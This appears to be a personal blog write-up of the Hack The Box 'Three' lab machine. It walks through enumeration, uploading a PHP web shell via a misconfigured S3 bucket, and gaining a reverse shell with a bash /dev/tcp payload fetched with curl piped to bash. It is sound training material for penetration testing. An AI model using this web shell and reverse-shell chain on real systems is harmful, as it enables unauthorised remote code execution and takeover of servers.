# HTB(Three-Linux) 

![](/Assets/HTB/THREE/assets/three.jpg) 

# _**Summary**_ 

* _in this Box will new some steps in *cloud pentesting* and will know about *Amazon S3* and how we can know about its contents and how make our machine contact easily with it._ 

# _**NMAP**_
![](/Assets/HTB/THREE/assets/namp.png)

# _**Ports**_ 
_we find port 22 for ssh connection and port 80 for http service will discover it , let's check it by browser ._ 



![](/Assets/HTB/THREE/assets/web.png)



_By checking the web using web browser we find the static page and will check the **subdomains** for this host by using **gobuster** as follow ._

_**NOTE** : add ip of machine in **/etc/hosts**_ 

_**like that  echo "10.129.227.248 thetoppers.htb"**_  _**|sudo tee -a /etc/hosts**_

![](/Assets/HTB/THREE/assets/gobuster.png)

_we found subdomain will be foucs with it **s3.thetoppers.htb** by search on google about it , will find info about **amazon s3 cloud storage**_

![](/Assets/HTB/THREE/assets/s3amazon.png)

_**NOTE**  we should add the subdomain **s3.thetopper.htb** in /etc/hosts like that_ 


![](/Assets/HTB/THREE/assets/s3.png)

_The webpage only contains the perivous JSON._

_We can interact with this S3 bucket with the aid of the **awscli** utility. It can be installed on Linux using the command **apt install awscli**_

_First, we need to configure it using the following command. **aws configure**_

![](/Assets/HTB/THREE/assets/ls.png)

_We can list all of the S3 buckets hosted by the server by using the ls command._

**aws --endpoint=http://s3.thetoppers.htb s3 ls**

_We see the files index.php , .htaccess and a directory called images in the specified bucket. It seems like
this is the webroot of the website running on port 80 . So the Apache server is using this S3 bucket as
storage._

_**awscli** has got another feature that allows us to copy files to a remote bucket. We already know that the
website is using PHP. Thus, we can try uploading a PHP shell file to the S3 bucket and since it's uploaded to
the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we
will achieve remote code execution._


_We can use the following PHP one-liner which uses the system() function which takes the URL parameter
cmd as an input and executes it as a system command._

**<?php system($_GET["cmd"]); ?>**

_then make file php_

**echo '<?php system($_GET["cmd"]); ?>' > shell.php**

_Then, we can upload this PHP shell to the thetoppers.htb S3 bucket using the following command_


**aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb**

![](/Assets/HTB/THREE/assets/shell.png)


![](/Assets/HTB/THREE/assets/result.png)

_We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try
executing the OS command id using the URL parameter **cmd**_

![](/Assets/HTB/THREE/assets/id.png)

_The response from the server contains the output of the OS command id , which verified that we have code
execution on the box. Thus, let us now try to obtain a reverse shell.
Through a reverse shell, we will trigger the remote host to connect back to our local machine's IP address on
the specified listening port. We can obtain the tun0 IP address of our local machine using the following
command._


_Let's get a reverse shell by creating a new file shell.sh containing the following bash reverse shell payload
which will connect back to our local machine on port 1337 ._



_bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1_

_will start net cat listener by command **nc -nvlp 1337**_

_in addtion to will start http local server on port 8000 and host this bash file and we must open http server from directory which have bash file_

_by this command will start http server **python3 -m http.server 8000**_

![](/Assets/HTB/THREE/assets/httpremote.png)

_we will use **curl** to fetch the bash file and do that in browser by this **http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash**_ 

![](/Assets/HTB/THREE/assets/remote1.png)

![](/Assets/HTB/THREE/assets/flag1.png)



## _**Thanks for watching my Blog**_

### _**Mohamed Emam**_
























